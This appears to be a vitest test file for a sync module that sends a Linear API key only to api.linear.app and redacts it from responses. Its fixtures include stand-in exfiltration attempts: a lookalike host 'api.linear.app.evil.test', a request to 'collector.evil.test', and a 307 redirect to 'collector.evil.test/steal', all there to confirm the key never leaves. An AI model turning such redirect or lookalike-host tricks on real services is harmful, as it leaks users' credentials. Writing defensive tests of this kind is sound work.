// What a sync opens to read a builtin provider's connection (T4-24): which
// connection it reads, and a fetch that reaches the provider's host and
// nowhere else — with the Linear key filled at the egress door for
// api.linear.app only, never by the caller.

import { readFileSync } from "node:fs";
import { describe, expect, it } from "vitest";
import { parse } from "yaml";
import { EgressRefused, parseScheduled } from "@foldedspacelabs/metistry-core";
import {
  ConnectionRefused,
  LINEAR_GRAPHQL_URL,
  LINEAR_MODULE,
  LINEAR_ORIGIN,
  LINEAR_SYNC,
  describeConnections,
  envSecretSource,
  openSyncHttp,
  syncReaders,
  syncSecretNames,
  syncTarget,
  type OpenedSync,
  type SyncHttp,
} from "../src/index.js";
import { catalogOf } from "./helpers.js";

/** The shipped connection type, read from the seed — so the test holds the real manifest, not a copy. */
const LINEAR_TYPE = parse(readFileSync(new URL("../../../seed/connection-types/linear/manifest.yaml", import.meta.url), "utf8")) as Record<string, unknown>;
// a personal key's shape; built at run time so no key-shaped literal is in the tree
const KEY = ["lin", "api", "Zq8Rk2Vt7Wm4Xp1Ys6Bn3Cd9Fg5Hj0Kl2Mn4Pq7Rs"].join("_");
const ENV = { METISTRY_SECRET_LINEAR_API_KEY: KEY };

const linearFile = (over: Record<string, unknown> = {}) => ({
  name: "linear",
  type: "tracker",
  provider: "linear",
  reach: { http: { url: "https://api.linear.app/graphql", auth: { scheme: "api_key", header: "Authorization", secret: "linear_api_key" } } },
  secrets: ["linear_api_key"],
  ...over,
});

const POLICY = `
secrets:
  linear_api_key:
    hosts: [api.linear.app]
    grants: { "connection:linear": on }
`;

function catalog(files: Record<string, unknown>[] = [linearFile()], extra: { secrets?: string; scheduled?: string } = {}) {
  const c = catalogOf(files, { secrets: extra.secrets ?? POLICY, types: [LINEAR_TYPE] });
  return { ...c, scheduled: extra.scheduled ? parseScheduled(extra.scheduled).value : null };
}

interface Sent {
  url: string;
  headers: Record<string, string>;
  body: string;
  redirect: RequestRedirect | undefined;
}

function recorder(answer: (s: Sent) => Response = () => Response.json({ data: { ok: true } })) {
  const sent: Sent[] = [];
  const fetchFn = (async (input: RequestInfo | URL, init: RequestInit = {}) => {
    const headers: Record<string, string> = {};
    new Headers(init.headers).forEach((v, k) => (headers[k] = v));
    const s = { url: String(input), headers, body: typeof init.body === "string" ? init.body : "", redirect: init.redirect };
    sent.push(s);
    return answer(s);
  }) as typeof fetch;
  return { sent, fetchFn };
}

function open(cat = catalog(), fetchFn?: typeof fetch, env: NodeJS.ProcessEnv = ENV): OpenedSync {
  return openSyncHttp({ catalog: cat, sync: LINEAR_SYNC, origin: LINEAR_ORIGIN, module: LINEAR_MODULE, secrets: envSecretSource(env), ...(fetchFn ? { fetch: fetchFn } : {}) });
}

function opened(o: OpenedSync): SyncHttp {
  if (!o.ok) throw new Error(`expected an open sync, got ${o.status}: ${o.why}`);
  return o.sync;
}

describe("the shipped linear connection type", () => {
  it("validates, and a connection made the documented way is ok", () => {
    const c = catalog();
    expect(c.entries[0]?.status).toBe("ok");
    expect(c.entries[0]?.provider?.manifest).toMatchObject({ provides: "tracker", capabilities: ["read", "create"], sync: "linear", implementation: { kind: "builtin", module: "linear" } });
  });
});

describe("envSecretSource", () => {
  it("reads a delivered secret as METISTRY_SECRET_<NAME>, and nothing else", async () => {
    const s = envSecretSource({ METISTRY_SECRET_LINEAR_API_KEY: ` ${KEY} `, LINEAR_API_KEY: "not-this", METISTRY_SECRET_EMPTY: "  " });
    expect(await s.value("linear_api_key")).toBe(KEY);
    expect(await s.value("empty")).toBeUndefined();
    expect(await s.value("Not A Name")).toBeUndefined();
  });
});

describe("syncTarget — which connection a sync reads", () => {
  it("the one connection whose provider declares the sync, with no scheduled.yaml entry", () => {
    const t = syncTarget(catalog(), LINEAR_SYNC);
    expect(t.ok && t.entry.name).toBe("linear");
  });

  it("nothing to read is absent, never an error", () => {
    expect(syncTarget(catalog([]), LINEAR_SYNC)).toMatchObject({ ok: false, status: "absent" });
  });

  it("two and none named is refused — the owner names one; naming one picks it", () => {
    const two = catalog([linearFile(), linearFile({ name: "linear-second" })]);
    expect(syncTarget(two, LINEAR_SYNC)).toMatchObject({ ok: false, status: "failed", why: expect.stringContaining("syncs.linear.connection") });
    const named = catalog([linearFile(), linearFile({ name: "linear-second" })], { scheduled: "syncs:\n  linear: { connection: linear-second }\n" });
    const t = syncTarget(named, LINEAR_SYNC);
    expect(t.ok && t.entry.name).toBe("linear-second");
  });

  it("a named connection that is missing is absent; one another sync reads is refused", () => {
    expect(syncTarget(catalog([], { scheduled: "syncs:\n  linear: { connection: nope }\n" }), LINEAR_SYNC)).toMatchObject({ ok: false, status: "absent" });
    const mcp = { name: "gh", type: "mcp", provider: "custom", reach: { http: { url: "https://mcp.example.test/mcp" } } };
    expect(syncTarget(catalog([mcp], { scheduled: "syncs:\n  linear: { connection: gh }\n" }), LINEAR_SYNC)).toMatchObject({ ok: false, status: "failed" });
  });

  it("*used by* names the sync that reads it — the same rule", async () => {
    const c = catalog();
    expect(syncReaders(c).get("linear")).toEqual(["linear"]);
    const rows = await describeConnections(c);
    expect(rows[0]?.used_by).toEqual([{ kind: "sync", name: "linear" }]);
  });

  it("the secrets a sync-read connection lists are the ones delivered to the console — an MCP connection's are not", () => {
    const mcp = { name: "gh", type: "mcp", provider: "custom", reach: { http: { url: "https://mcp.example.test/mcp", auth: { scheme: "bearer", secret: "github_read" } } }, secrets: ["github_read"] };
    expect(syncSecretNames(catalog([linearFile(), mcp]))).toEqual(["linear_api_key"]);
  });
});

describe("openSyncHttp — the key goes to api.linear.app and nowhere else", () => {
  it("sends Authorization: <API_KEY>, no Bearer, filled at the door, to the listed host", async () => {
    const { sent, fetchFn } = recorder();
    const s = opened(open(catalog(), fetchFn));
    expect(s.headers).toEqual({ authorization: "{{ secret.linear_api_key }}" }); // a reference, never the value
    const res = await s.fetch(LINEAR_GRAPHQL_URL, { method: "POST", headers: s.headers, body: "{}" });
    expect(res.status).toBe(200);
    expect(sent).toHaveLength(1);
    expect(sent[0]!.url).toBe(LINEAR_GRAPHQL_URL);
    expect(sent[0]!.headers.authorization).toBe(KEY);
    expect(sent[0]!.redirect).toBe("manual");
    expect(s.secretsUsed()).toEqual(["linear_api_key"]);
  });

  it("**a connection pointed at another host is refused before anything is sent**", async () => {
    const { sent, fetchFn } = recorder();
    const o = open(catalog([linearFile({ reach: { http: { url: "https://api.linear.app.evil.test/graphql", auth: { scheme: "api_key", header: "Authorization", secret: "linear_api_key" } } } })]), fetchFn);
    expect(o).toMatchObject({ ok: false, status: "failed", why: expect.stringContaining("https://api.linear.app and nowhere else") });
    expect(sent).toHaveLength(0);
  });

  it("**a request to another origin is refused, and nothing is sent**", async () => {
    const { sent, fetchFn } = recorder();
    const s = opened(open(catalog(), fetchFn));
    await expect(s.fetch("https://collector.evil.test/graphql", { method: "POST", headers: s.headers, body: "{}" })).rejects.toMatchObject({ code: "other_host" });
    await expect(s.fetch("http://api.linear.app/graphql", { method: "POST", headers: s.headers, body: "{}" })).rejects.toBeInstanceOf(ConnectionRefused);
    expect(sent).toHaveLength(0);
  });

  it("**a secret whose Sent-only-to list names another host is not filled for Linear — or anywhere**", async () => {
    const { sent, fetchFn } = recorder();
    const s = opened(open(catalog([linearFile()], { secrets: POLICY.replace("[api.linear.app]", "[collector.evil.test]") }), fetchFn));
    const err = await s.fetch(LINEAR_GRAPHQL_URL, { method: "POST", headers: s.headers, body: "{}" }).catch((e: unknown) => e);
    expect(err).toBeInstanceOf(EgressRefused);
    expect((err as EgressRefused).code).toBe("host_not_listed");
    expect(String(err)).not.toContain(KEY);
    expect(sent).toHaveLength(0);
  });

  it("**not granted to the connection is refused at the door**", async () => {
    const { sent, fetchFn } = recorder();
    const s = opened(open(catalog([linearFile()], { secrets: POLICY.replace('"connection:linear": on', '"connection:other": on') }), fetchFn));
    await expect(s.fetch(LINEAR_GRAPHQL_URL, { method: "POST", headers: s.headers, body: "{}" })).rejects.toMatchObject({ code: "not_granted" });
    expect(sent).toHaveLength(0);
  });

  it("no delivered value is missing_secret — nothing is sent", async () => {
    const { sent, fetchFn } = recorder();
    const s = opened(open(catalog(), fetchFn, {}));
    await expect(s.fetch(LINEAR_GRAPHQL_URL, { method: "POST", headers: s.headers, body: "{}" })).rejects.toMatchObject({ code: "missing_secret" });
    expect(sent).toHaveLength(0);
  });

  it("**a redirect is not followed — the key never reaches where it points**", async () => {
    const { sent, fetchFn } = recorder(() => new Response(null, { status: 307, headers: { location: "https://collector.evil.test/steal" } }));
    const s = opened(open(catalog(), fetchFn));
    await expect(s.fetch(LINEAR_GRAPHQL_URL, { method: "POST", headers: s.headers, body: "{}" })).rejects.toMatchObject({ code: "other_host" });
    expect(sent.map((x) => x.url)).toEqual([LINEAR_GRAPHQL_URL]);
  });

  it("**what comes back is redacted: a response echoing the key shows its name, never the value**", async () => {
    const { fetchFn } = recorder((s) => Response.json({ errors: [{ message: `bad key ${s.headers.authorization}` }] }, { headers: { "x-echo": s.headers.authorization ?? "" } }));
    const s = opened(open(catalog(), fetchFn));
    const res = await s.fetch(LINEAR_GRAPHQL_URL, { method: "POST", headers: s.headers, body: "{}" });
    const text = await res.text();
    expect(text).not.toContain(KEY);
    expect(text).toContain("REDACTED secret.linear_api_key");
    expect(res.headers.get("x-echo")).not.toContain(KEY);
  });

  it("a query parameter, a {{ variable }} header, basic or oauth sign-in, and a provider this module does not implement are each refused", () => {
    const withReach = (http: Record<string, unknown>) => linearFile({ reach: { http: { url: "https://api.linear.app/graphql", ...http } } });
    expect(open(catalog([withReach({ query: { a: "b" } })]))).toMatchObject({ ok: false, status: "failed" });
    expect(
      open(catalog([linearFile({ variables: ["team"], reach: { http: { url: "https://api.linear.app/graphql", headers: { "X-Team": "{{ variable.team }}" } } } })])),
    ).toMatchObject({ ok: false, status: "failed" });
    expect(openSyncHttp({ catalog: catalog(), sync: LINEAR_SYNC, origin: LINEAR_ORIGIN, module: "other", secrets: envSecretSource(ENV) })).toMatchObject({ ok: false, status: "failed" });
  });

  it("the owner's raise switches come from scheduled.yaml, and only what the file says", () => {
    expect(opened(open(catalog())).raise).toEqual({});
    expect(opened(open(catalog([linearFile()], { scheduled: "syncs:\n  linear: { connection: linear, raise: { assigned: false } }\n" }))).raise).toEqual({ assigned: false });
  });
});

describe("the listing says what the door would refuse", () => {
  it("a Linear connection whose secret does not list api.linear.app is failed, naming the host", async () => {
    const rows = await describeConnections(catalog([linearFile()], { secrets: POLICY.replace("[api.linear.app]", "[]") }));
    expect(rows[0]?.status).toBe("failed");
    expect(rows[0]?.issues.join(" ")).toContain("may not be sent to api.linear.app");
  });
});
